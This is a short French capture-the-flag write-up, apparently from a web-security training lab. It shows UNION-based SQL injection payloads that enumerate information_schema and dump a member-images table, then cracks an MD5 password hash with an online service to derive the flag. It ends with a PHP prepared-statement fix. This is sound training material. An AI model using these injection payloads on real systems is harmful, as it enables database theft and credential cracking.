# Vulnérabilité

Sur la page membres, cette injection SQL basique nous permet de lister les tables SQL exsitantes:

`1=1 UNION SELECT table_name, table_schema FROM information_schema.tables;`

On trouve alors une table nommée `list_images` avec un schéma `Member_images`.

Ensuite on peut lister les colonnes de toutes les tables avec cette injection SQL:

`1=1 UNION SELECT table_name, column_name FROM information_schema.columns;`

On identifie alors 4 colonnes: `id`, `url`, `title` et `comment`.

Maintenant que nous avons toutes ces informations nous pouvons faire une requête SQL via injection pour récupérer toutes les informations que nous souhaitons sur la table.

`1=1 UNION SELECT 1, CONCAT(id, url, title, comment) FROM Member_images.list_images;`

On retrouve le hash du mot de passe `1928e8083cf461a51303633093573c46` et en suivant les indications:

- On utlise https://md5decrypt.net/ pour décrypter le hash et on retrouve alors le mot de passe d'origine `albatroz`.
- Enfin on encrypte en SHA256 (https://md5decrypt.net/Sha256) et on obtient le flag.

# Solution

Pour se protéger de la faille, il faut utiliser des requêtes préparées.

__Exemple en PHP:__

```
// Avec PDO (https://www.php.net/manual/fr/pdo.prepare.php)

$stmt = $pdo->prepare('SELECT * FROM salaries WHERE prenom = :prenom');
$stmt->execute(array('prenom' => $prenom));

foreach ($stmt as $ligne) {
	// Traitement de la ligne de résultat
}
```